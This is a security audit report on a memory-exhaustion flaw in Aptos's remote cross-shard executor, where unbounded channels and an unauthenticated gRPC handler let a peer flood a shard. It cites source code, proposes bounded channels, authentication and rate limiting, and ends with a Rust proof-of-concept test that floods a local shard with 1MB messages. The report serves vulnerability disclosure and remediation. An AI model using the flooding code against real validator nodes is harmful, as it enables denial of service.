# Audit Report

## Title
Unbounded Channel Memory Exhaustion in Remote Cross-Shard Communication

## Summary
The `RemoteCrossShardClient::new()` function creates unbounded channels for cross-shard message passing without authentication or rate limiting, allowing Byzantine or compromised shards to flood victim shards with messages, causing memory exhaustion and potential node crashes.

## Finding Description

The remote executor service implements sharded parallel block execution where multiple shards communicate via network channels. The vulnerability exists in how these communication channels are created and managed:

**1. Unbounded Channel Creation:** [1](#0-0) [2](#0-1) 

Both `create_outbound_channel()` and `create_inbound_channel()` use `crossbeam_channel::unbounded()` to create channels with no capacity limits. For each remote shard and each partitioning round (up to MAX_ALLOWED_PARTITIONING_ROUNDS = 8), separate unbounded channels are allocated: [3](#0-2) [4](#0-3) 

**2. No Authentication or Rate Limiting:**

The gRPC server accepts messages from any remote peer without authenticating the sender or rate limiting: [5](#0-4) 

Messages are directly pushed into unbounded channels via `handler.send(msg).unwrap()` without validation.

**3. Blocking Consumer Without Timeout:**

The receiver continuously blocks waiting for messages without timeout protection: [6](#0-5) [7](#0-6) 

**Attack Scenario:**

1. A Byzantine shard (compromised through vulnerability, misconfiguration, or insider threat) or an attacker with network access to shard endpoints identifies victim shard addresses
2. Attacker sends unlimited `CrossShardMsg::RemoteTxnWriteMsg` messages to victim shards
3. Messages accumulate in unbounded channels (up to 8 channels per victim shard for different rounds)
4. Memory consumption grows unbounded until victim shard experiences:
   - Severe performance degradation
   - Out-of-memory (OOM) conditions
   - Process termination by OS OOM killer
5. Multiple shard failures can cause consensus liveness issues

The vulnerability breaks **Invariant #9**: "Resource Limits: All operations must respect gas, storage, and computational limits" - unbounded memory growth violates resource constraints.

## Impact Explanation

**Severity: High** (per Aptos Bug Bounty criteria)

This vulnerability falls under High Severity impacts:
- **Validator node slowdowns**: Memory exhaustion causes severe performance degradation
- **API crashes**: OOM conditions can crash the executor service
- **Significant protocol violations**: Uncontrolled resource consumption violates protocol assumptions

While not immediately critical (doesn't directly compromise funds or consensus safety), the impact includes:
- Degraded validator performance affecting block production
- Potential node crashes requiring manual intervention
- Risk of cascading failures if multiple shards are targeted
- Possible exploitation during critical consensus operations (epoch transitions, validator changes)

The vulnerability could escalate to **Critical** if exploited to cause coordinated shard failures during consensus-critical periods, potentially leading to liveness failures requiring hardfork recovery.

## Likelihood Explanation

**Likelihood: Medium-to-High**

The attack is feasible under these conditions:

**Attack Prerequisites:**
- Network access to executor shard gRPC endpoints (ports may be exposed on internal networks)
- OR compromise of a single shard in a multi-shard deployment
- Knowledge of victim shard addresses and message formats (available in public codebase)

**Factors Increasing Likelihood:**
- No authentication requirements - any network peer can send messages
- No rate limiting - attacker can send unlimited messages at line rate
- Multiple attack surfaces - 8 channels per victim shard (one per partitioning round)
- Message format is simple and publicly documented
- No alerting/monitoring for abnormal cross-shard message volumes

**Factors Decreasing Likelihood:**
- Shard endpoints may be on isolated internal networks (defense-in-depth)
- Sharded execution may not be enabled in all validator deployments
- Requires sustained network bandwidth to exhaust memory

The lack of basic security controls (authentication, rate limiting, bounded channels) makes this readily exploitable once network access is obtained.

## Recommendation

Implement multiple defense layers:

**1. Use Bounded Channels with Appropriate Capacity:**

```rust
// In network_controller/mod.rs
pub fn create_outbound_channel(
    &mut self,
    remote_peer_addr: SocketAddr,
    message_type: String,
) -> Sender<Message> {
    // Use bounded channel with reasonable capacity
    const CHANNEL_CAPACITY: usize = 1000; // Tune based on expected load
    let (outbound_sender, outbound_receiver) = bounded(CHANNEL_CAPACITY);

    self.outbound_handler
        .register_handler(message_type, remote_peer_addr, outbound_receiver);

    outbound_sender
}

pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
    const CHANNEL_CAPACITY: usize = 1000;
    let (inbound_sender, inbound_receiver) = bounded(CHANNEL_CAPACITY);

    self.inbound_handler
        .lock()
        .unwrap()
        .register_handler(message_type, inbound_sender);

    inbound_receiver
}
```

**2. Add Sender Authentication:**

Implement mutual TLS or signature-based authentication to verify shard identity before accepting messages. Extend `NetworkMessage` to include cryptographic proof of sender identity.

**3. Implement Rate Limiting:**

Add per-peer rate limiting in the gRPC handler:

```rust
// Track message rates per peer
let rate_limiter = Arc::new(RateLimiter::new(messages_per_second));

async fn simple_msg_exchange(
    &self,
    request: Request<NetworkMessage>,
) -> Result<Response<Empty>, Status> {
    let remote_addr = request.remote_addr()
        .ok_or_else(|| Status::unauthenticated("No remote address"))?;
    
    // Check rate limit
    if !self.rate_limiter.check_and_update(remote_addr) {
        return Err(Status::resource_exhausted("Rate limit exceeded"));
    }
    
    // ... rest of message handling
}
```

**4. Add Backpressure Handling:**

When channels are full (bounded), apply backpressure by returning errors to senders, forcing them to retry with exponential backoff.

**5. Monitoring and Alerting:**

Add metrics for channel utilization and message rates to detect anomalous patterns.

## Proof of Concept

```rust
// File: secure/net/tests/channel_flooding_test.rs
#[cfg(test)]
mod tests {
    use aptos_secure_net::network_controller::{Message, NetworkController};
    use aptos_config::utils;
    use std::{
        net::{IpAddr, Ipv4Addr, SocketAddr},
        thread,
        time::Duration,
    };

    #[test]
    #[ignore] // Run manually to observe memory exhaustion
    fn test_unbounded_channel_memory_exhaustion() {
        // Setup victim shard
        let victim_port = utils::get_available_port();
        let victim_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), victim_port);
        let mut victim_controller = NetworkController::new(
            "victim_shard".to_string(),
            victim_addr,
            5000
        );
        
        // Create inbound channel for cross-shard messages
        let message_type = "cross_shard_0".to_string();
        let _victim_rx = victim_controller.create_inbound_channel(message_type.clone());
        victim_controller.start();
        
        // Setup attacker shard
        let attacker_port = utils::get_available_port();
        let attacker_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), attacker_port);
        let mut attacker_controller = NetworkController::new(
            "attacker_shard".to_string(),
            attacker_addr,
            5000
        );
        
        let attacker_tx = attacker_controller.create_outbound_channel(
            victim_addr,
            message_type
        );
        attacker_controller.start();
        
        thread::sleep(Duration::from_millis(100));
        
        // Flood victim with messages
        println!("Starting flood attack...");
        let large_payload = vec![0u8; 1024 * 1024]; // 1MB per message
        
        for i in 0..10000 {
            let msg = Message::new(large_payload.clone());
            attacker_tx.send(msg).unwrap();
            
            if i % 100 == 0 {
                println!("Sent {} messages, checking memory...", i);
                // In real attack, memory would grow unbounded
                // Victim's channel would accumulate all messages
            }
        }
        
        println!("Flood complete. Victim channel now holds unbounded messages.");
        println!("Expected behavior: Memory exhaustion, potential OOM crash");
        
        // Cleanup
        thread::sleep(Duration::from_millis(100));
        victim_controller.shutdown();
        attacker_controller.shutdown();
    }
}
```

**To demonstrate the vulnerability:**
1. Run the PoC with memory profiling enabled
2. Observe unbounded memory growth in victim process
3. With sufficient messages and payload size, victim will experience OOM
4. No authentication or rate limiting prevents the attack

## Notes

This vulnerability is particularly concerning because:
- The sharded executor is designed for high-performance parallel execution
- Unbounded channels seem to be a performance optimization choice
- However, this trades security for performance in a distributed system where Byzantine behavior must be assumed
- The lack of authentication between shards suggests the original design assumed trusted internal networks
- Modern threat models require defense-in-depth even for internal services

### Citations

**File:** secure/net/src/network_controller/mod.rs (L115-126)
```rust
    pub fn create_outbound_channel(
        &mut self,
        remote_peer_addr: SocketAddr,
        message_type: String,
    ) -> Sender<Message> {
        let (outbound_sender, outbound_receiver) = unbounded();

        self.outbound_handler
            .register_handler(message_type, remote_peer_addr, outbound_receiver);

        outbound_sender
    }
```

**File:** secure/net/src/network_controller/mod.rs (L128-137)
```rust
    pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
        let (inbound_sender, inbound_receiver) = unbounded();

        self.inbound_handler
            .lock()
            .unwrap()
            .register_handler(message_type, inbound_sender);

        inbound_receiver
    }
```

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L22-47)
```rust
    pub fn new(controller: &mut NetworkController, shard_addresses: Vec<SocketAddr>) -> Self {
        let mut message_txs = vec![];
        let mut message_rxs = vec![];
        // Create outbound channels for each shard per round.
        for remote_address in shard_addresses.iter() {
            let mut txs = vec![];
            for round in 0..MAX_ALLOWED_PARTITIONING_ROUNDS {
                let message_type = format!("cross_shard_{}", round);
                let tx = controller.create_outbound_channel(*remote_address, message_type);
                txs.push(Mutex::new(tx));
            }
            message_txs.push(txs);
        }

        // Create inbound channels for each round
        for round in 0..MAX_ALLOWED_PARTITIONING_ROUNDS {
            let message_type = format!("cross_shard_{}", round);
            let rx = controller.create_inbound_channel(message_type);
            message_rxs.push(Mutex::new(rx));
        }

        Self {
            message_txs: Arc::new(message_txs),
            message_rxs: Arc::new(message_rxs),
        }
    }
```

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L61-66)
```rust
    fn receive_cross_shard_msg(&self, current_round: RoundId) -> CrossShardMsg {
        let rx = self.message_rxs[current_round].lock().unwrap();
        let message = rx.recv().unwrap();
        let msg: CrossShardMsg = bcs::from_bytes(&message.to_bytes()).unwrap();
        msg
    }
```

**File:** types/src/block_executor/partitioner.rs (L20-22)
```rust
pub static MAX_ALLOWED_PARTITIONING_ROUNDS: usize = 8;
pub static GLOBAL_ROUND_ID: usize = MAX_ALLOWED_PARTITIONING_ROUNDS + 1;
pub static GLOBAL_SHARD_ID: usize = usize::MAX;
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_client.rs (L26-45)
```rust
    pub fn start<S: StateView + Sync + Send>(
        cross_shard_state_view: Arc<CrossShardStateView<S>>,
        cross_shard_client: Arc<dyn CrossShardClient>,
        round: RoundId,
    ) {
        loop {
            let msg = cross_shard_client.receive_cross_shard_msg(round);
            match msg {
                RemoteTxnWriteMsg(txn_commit_msg) => {
                    let (state_key, write_op) = txn_commit_msg.take();
                    cross_shard_state_view
                        .set_value(&state_key, write_op.and_then(|w| w.as_state_value()));
                },
                CrossShardMsg::StopMsg => {
                    trace!("Cross shard commit receiver stopped for round {}", round);
                    break;
                },
            }
        }
    }
```
